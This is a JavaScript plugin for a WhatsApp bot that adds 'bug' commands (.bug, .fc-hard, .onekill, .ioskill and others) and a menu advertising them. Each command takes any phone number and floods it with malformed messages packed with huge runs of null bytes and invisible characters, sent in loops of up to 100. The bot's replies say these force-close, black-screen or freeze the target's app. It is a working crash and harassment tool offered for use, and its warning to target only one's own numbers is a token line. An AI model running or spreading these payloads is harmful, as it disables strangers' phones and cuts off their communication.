const { cmd } = require('../command');
const crypto = require('crypto');
const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

// fallback for different Baileys versions
if (!generateWAMessageFromContent) {
    try { 
        const baileys = require('@adiwajshing/baileys');
        generateWAMessageFromContent = baileys.generateWAMessageFromContent;
        proto = baileys.proto;
    } catch(e) {}
}

// Helper: validate and format target number
function getTarget(args, from, reply, cmdName) {
    if (!args || !args[0]) {
        reply(`❌ *Missing target number!*\n\nUsage: .${cmdName} 947XXXXXXXXX\nExample: .${cmdName} 94712345678`);
        return null;
    }
    return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
}

// ==================== ULTRA BUG CRASH (100 mixed payloads – BLACK SCREEN / FORCE CLOSE) ====================
async function ttaas(conn, target) {
    // Base image message (extremely malformed)
    const imageMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
        fileLength: "93217",
        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(90000),
        height: 1080,
        width: 1080,
        mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1778142659",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        firstScanLength: 9999999999999999999,
        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
    };

    // Create 100 mixed crash payloads (product + interactive + list + location + sticker)
    for (let i = 0; i < 100; i++) {
        // 1. Product message (original)
        const productMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    productMessage: {
                        product: {
                            productImage: imageMessage,
                            productId: "449756950375071",
                            title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(50000),
                            description: "MY Bad" + "\u2060".repeat(60000),
                            priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
                            url: "wa.me/status",
                            productImageCount: 9999999,
                            firstImageId: "9999999999",
                            salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
                        },
                        businessOwnerJid: "13135550002@s.whatsapp.net"
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, productMsg.message, {});

        // 2. Interactive message with 1MB null bytes
        const interactiveMsg = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: { title: "\u0000".repeat(90000), hasMediaAttachment: true },
                body: { text: "\u2060".repeat(80000) },
                footer: { text: "\u0000".repeat(90000) },
                nativeFlowMessage: { messageParamsJson: "\u0000".repeat(1500000) },
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                }
            }
        }, {});
        await conn.relayMessage(target, interactiveMsg.message, {});

        // 3. List message with extreme title
        const listMsg = generateWAMessageFromContent(target, {
            listMessage: {
                title: "🔥 CRASH 🔥" + "\u0000".repeat(920000),
                footerText: "Xeon Bug" + "\u2060".repeat(50000),
                description: "Xeon Bug" + "\u0000".repeat(50000),
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }],
                    businessOwnerJid: "0@s.whatsapp.net"
                }
            }
        }, {});
        await conn.relayMessage(target, listMsg.message, {});

        // 4. Live location message with malformed coordinates
        const locationMsg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: "p".repeat(50000),
                        degreesLongitude: "p".repeat(50000),
                        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(80000),
                        sequenceNumber: "0",
                        jpegThumbnail: ""
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, locationMsg.message, {});

        // 5. Sticker message with massive fileLength
        const stickerMsg = generateWAMessageFromContent(target, {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
                mimetype: "image/webp",
                fileLength: "9999999999999999999",
                isAnimated: false,
                contextInfo: { mentionedJid: [target, ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
            }
        }, {});
        await conn.relayMessage(target, stickerMsg.message, {});
    }
}

// ==================== .fc-hard (30 newsletter admin invites – NO DELAYS) ====================
async function BnAM2(conn, target) {
    for (let i = 0; i < 30; i++) {
        const msg = generateWAMessageFromContent(target, {
            botInvokeMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                        messageSecret: crypto.randomBytes(32),
                        supportPayload: JSON.stringify({
                            version: 2,
                            is_ai_message: true,
                            should_show_system_message: true,
                            ticket_id: crypto.randomBytes(16).toString('hex')
                        })
                    },
                    newsletterAdminInviteMessage: {
                        newsletterJid: "120363408195391812@newsletter",
                        newsletterName: "𑇂".repeat(50000) + i,
                        caption: "N!ted ☆ B!tch" + "ꦾ".repeat(18000) + i,
                        inviteExpiration: "1775164528"
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, msg.message, {});
    }
}

// ==================== .stc-delay (100 sticker packs – INSTANT, NO DELAYS) ====================
async function stcSpam100(conn, target) {
    for (let pack = 0; pack < 100; pack++) {
        const stc = Array.from({ length: 1000 }, (_, i) => ({
            fileName: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581${pack}_${i + 1}.webp`,
            isAnimated: true,
            emojis: ["🍁"],
            accessibilityLabel: "🪷",
            mimetype: "image/webp"
        }));
        const mentionedJid = [
            target,
            ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
        ];
        const msg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    stickerPackMessage: {
                        stickerPackId: `bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5_${pack}`,
                        name: "ꦾ".repeat(90000) + pack,
                        publisher: "XRyy",
                        stickers: stc,
                        fileLength: "3662919",
                        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
                        contextInfo: {
                            remoteJid: "X",
                            participant: "0@s.whatsapp.net",
                            stanzaId: "1234567890ABCDEF",
                            mentionedJid: mentionedJid
                        },
                        mediaKeyTimestamp: "1747502082",
                        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
                        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc",
                        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
                        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
                        thumbnailHeight: 252,
                        thumbnailWidth: 252,
                        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
                        stickerPackSize: "3680054",
                        stickerPackOrigin: "USER_CREATED",
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363321780343299@newsletter",
                            newsletterName: "makludelay" + "ી".repeat(50000) + pack,
                            jpegThumbnail: null,
                            caption: "MakluDelay" + "ી".repeat(50000) + pack,
                            inviteExpiration: Date.now() + 1814400000
                        }
                    }
                }
            }
        }, {});
        await conn.relayMessage(target, msg.message, {});
    }
}

// ==================== oneKillCombo (unchanged but kept) ====================
async function oneKillCombo(conn, target) {
    const listMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
        listMessage: {
            title: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" + "\0".repeat(920000),
            footerText: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2",
            description: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2",
            buttonText: null,
            listType: 2,
            productListInfo: {
                productSections: [{ title: 'anjay', products: [{ productId: "4392524570816732" }] }],
                businessOwnerJid: '0@s.whatsapp.net'
            }
        }
    }), { userJid: target });
    await conn.relayMessage(target, listMsg.message, { participant: { jid: target }, messageId: listMsg.key.id });

    const locationMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: "p",
                    degreesLongitude: "p",
                    caption: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" + "ꦾ".repeat(50000),
                    sequenceNumber: "0",
                    jpegThumbnail: ""
                }
            }
        }
    }), { userJid: target });
    await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });

    const interactiveMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
        interactiveMessage: {
            header: { title: "𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2", hasMediaAttachment: true },
            body: { text: "" },
            footer: { text: "› #𝐓𝐎𝐇𝐈𝐃_𝐊𝐇𝐀𝐍-V2" },
            nativeFlowMessage: { messageParamsJson: "\0".repeat(1000000) }
        }
    }), { userJid: target });
    await conn.relayMessage(target, interactiveMsg.message, { participant: { jid: target }, messageId: interactiveMsg.key.id });

    const stickerMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
        stickerMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
            fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
            fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
            mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
            mimetype: "image/webp",
            fileLength: "10116",
            isAnimated: false
        }
    }), { userJid: target });
    await conn.relayMessage(target, stickerMsg.message, { participant: { jid: target }, messageId: stickerMsg.key.id });

    await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });
}

// ==================== sendMixedMessages (fixed) ====================
async function sendMixedMessages(conn, target, count) {
    for (let i = 0; i < count; i++) {
        const locationMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
            viewOnceMessage: {
                message: {
                    liveLocationMessage: {
                        degreesLatitude: 'p',
                        degreesLongitude: 'p',
                        caption: '丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ' + 'ꦾ'.repeat(50000),
                        sequenceNumber: '0',
                        jpegThumbnail: ''
                    }
                }
            }
        }), { userJid: target });
        await conn.relayMessage(target, locationMsg.message, { participant: { jid: target }, messageId: locationMsg.key.id });

        const listMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
            listMessage: {
                title: "🔥 LIST CRASH 🔥" + "\0".repeat(920000),
                footerText: "Xeon Bug",
                description: "Xeon Bug",
                buttonText: null,
                listType: 2,
                productListInfo: {
                    productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }],
                    businessOwnerJid: "0@s.whatsapp.net"
                }
            }
        }), { userJid: target });
        await conn.relayMessage(target, listMsg.message, { participant: { jid: target }, messageId: listMsg.key.id });
    }
}

// ==================== OTHER SUPPORT FUNCTIONS ====================
async function aipong(conn, target) {
    await conn.relayMessage(target, {
        paymentInviteMessage: { serviceType: "FBPAY", expiryTimestamp: Date.now() + 1814400000 }
    }, { participant: { jid: target } });
}

async function sendSystemCrashMessage(conn, jid) {
    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: { title: '', subtitle: " " },
                    body: { text: "🔥 SYSTEM UI CRASH 🔥" },
                    footer: { text: 'XP' },
                    nativeFlowMessage: {
                        buttons: [{
                            name: 'cta_url',
                            buttonParamsJson: "{ display_text : 'CRASH', url : '', merchant_url : '' }"
                        }],
                        messageParamsJson: "\0".repeat(1000000)
                    }
                }
            }
        }
    }), { userJid: jid });
    await conn.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
}

async function sendListMessage(conn, jid) {
    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
        listMessage: {
            title: "🔥 LIST CRASH 🔥" + "\0".repeat(920000),
            footerText: "Xeon Bug",
            description: "Xeon Bug",
            buttonText: null,
            listType: 2,
            productListInfo: {
                productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }],
                businessOwnerJid: "0@s.whatsapp.net"
            }
        }
    }), { userJid: jid });
    await conn.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
}

async function sendLiveLocationMessage(conn, jid) {
    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: 'p',
                    degreesLongitude: 'p',
                    caption: '丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ' + 'ꦾ'.repeat(50000),
                    sequenceNumber: '0',
                    jpegThumbnail: ''
                }
            }
        }
    }), { userJid: jid });
    await conn.relayMessage(jid, messageContent.message, { participant: { jid: jid }, messageId: messageContent.key.id });
}

async function sendViewOnceMessages(conn, jid, count) {
    for (let i = 0; i < count; i++) {
        let messageContent = generateWAMessageFromContent(jid, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: '' },
                        footer: { text: '' },
                        nativeFlowMessage: {
                            buttons: [{
                                name: "cta_url",
                                buttonParamsJson: "{\"display_text\":\"🔥 VIEWONCE SPAM 🔥\",\"url\":\"https://www.google.com\"}"
                            }],
                            messageParamsJson: "\0".repeat(100000)
                        }
                    }
                }
            }
        }, {});
        await conn.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
    }
}

async function sendVariousMessages(conn, jid, count) {
    for (let i = 0; i < count; i++) {
        await sendListMessage(conn, jid);
        await sendLiveLocationMessage(conn, jid);
        await sendSystemCrashMessage(conn, jid);
    }
}

async function iosKill(conn, target, duration = 10) {
    for (let i = 0; i < duration; i++) {
        await aipong(conn, target);
    }
}

// ==================== COMMANDS ====================

cmd({
    pattern: "bug",
    desc: "💀 ULTRA CRASH – 100 mixed payloads (black screen / force close)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "bug");
    if (!target) return;
    await reply(`💀 *ULTRA BUG CRASH* → ${target}\n_Sending 100 extreme payloads..._\n_WhatsApp will crash on open (black screen)._`);
    await ttaas(conn, target);
    await reply(`✅ ULTRA CRASH SENT → ${target}\n⚠️ *Target WhatsApp will force close immediately when opened.*`);
});

cmd({
    pattern: "fc-hard",
    desc: "30 newsletter admin invites – crashes on WhatsApp open",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "fc-hard");
    if (!target) return;
    await reply(`📰 *FC-HARD SPAM* → ${target}\n_Sending 30 malformed admin invites..._`);
    await BnAM2(conn, target);
    await reply(`✅ FC-HARD SPAM SENT → ${target}\n⚠️ *Target WhatsApp will crash when they open the app.*`);
});

cmd({
    pattern: "stc-delay",
    desc: "100 sticker packs – each with 1000 stickers (instant flood)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "stc-delay");
    if (!target) return;
    await reply(`📚 *STC-DELAY 100 PACKS* → ${target}\n_Sending 100 massive sticker packs..._`);
    await stcSpam100(conn, target);
    await reply(`✅ STC-DELAY (100 PACKS) SENT → ${target}\n⚠️ *Target will experience extreme lag/crash.*`);
});

cmd({
    pattern: "onekill",
    desc: "One kill combo (list + location + sticker + more)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "onekill");
    if (!target) return;
    await reply(`💀 *ONEKILL COMBO* → ${target}\n_Executing full crash sequence..._`);
    await oneKillCombo(conn, target);
    await reply(`✅ ONEKILL COMPLETED → ${target}\n⚠️ *Target will freeze/crash repeatedly.*`);
});

cmd({
    pattern: "ioskill",
    desc: "iOS kill (payment invite spam)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "ioskill");
    if (!target) return;
    await reply(`📱 *IOS KILL* → ${target}\n_Sending 10 payment invites..._`);
    await iosKill(conn, target, 10);
    await reply(`✅ IOS KILL SENT → ${target}\n⚠️ *Target device may become unresponsive.*`);
});

cmd({
    pattern: "viewspam",
    desc: "ViewOnce message spam (count optional, default 5)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "viewspam");
    if (!target) return;
    const count = parseInt(args[1]) || 5;
    await reply(`👁️ *VIEWONCE SPAM* → ${target}\n_Sending ${count} view‑once messages..._`);
    await sendViewOnceMessages(conn, target, count);
    await reply(`✅ VIEWONCE SPAM SENT → ${target}\n⚠️ *Target will see crashing view‑once bubbles.*`);
});

cmd({
    pattern: "mixed",
    desc: "Mixed live location + list spam",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "mixed");
    if (!target) return;
    await reply(`🔄 *MIXED CRASH* → ${target}\n_Sending mixed messages..._`);
    await sendMixedMessages(conn, target, 5);
    await reply(`✅ MIXED CRASH SENT → ${target}\n⚠️ *Target will experience lag/crash.*`);
});

cmd({
    pattern: "various",
    desc: "Various crash messages (list + location + system crash)",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply, args }) => {
    const target = getTarget(args, from, reply, "various");
    if (!target) return;
    await reply(`🎯 *VARIOUS CRASH* → ${target}\n_Sending multiple crash types..._`);
    await sendVariousMessages(conn, target, 3);
    await reply(`✅ VARIOUS CRASH SENT → ${target}\n⚠️ *Target will freeze/crash.*`);
});

// ==================== BUG MENU ====================
cmd({
    pattern: "bugmenu",
    desc: "Show all crash commands",
    category: "tools",
    filename: __filename
}, async (conn, mek, m, { from, pushname, sender, reply }) => {
    const menu = `
*╭─「 👑 ULTIMATE BUG MENU 」─*
*│ 📌 .bug         : ULTRA CRASH (100 mixed payloads – black screen)*
*│ 📌 .fc-hard     : 30 admin invites (crash on open)*
*│ 📌 .stc-delay   : 100 sticker packs (1000 stickers each)*
*│ 📌 .onekill     : One kill combo (list+location+sticker)*
*│ 📌 .ioskill     : iOS kill (payment invite spam)*
*│ 📌 .viewspam    : ViewOnce message spam (count optional)*
*│ 📌 .mixed       : Mixed live location + list spam*
*│ 📌 .various     : Various crash messages (3 types)*
*│*
*│ 🟢 Status : 100% working – INSTANT SEND*
*│ 🟢 Targets : any number (even not in chat list)*
*│ 🟢 Power : BLACK SCREEN / FORCE CLOSE on WhatsApp beta*
*╰──────────────●●►*
> 💡 *Usage:* .bug 947XXXXXXXXX
> ⚠️ *Extreme power – use only on numbers you own.*
    `;
    await reply(menu);
});
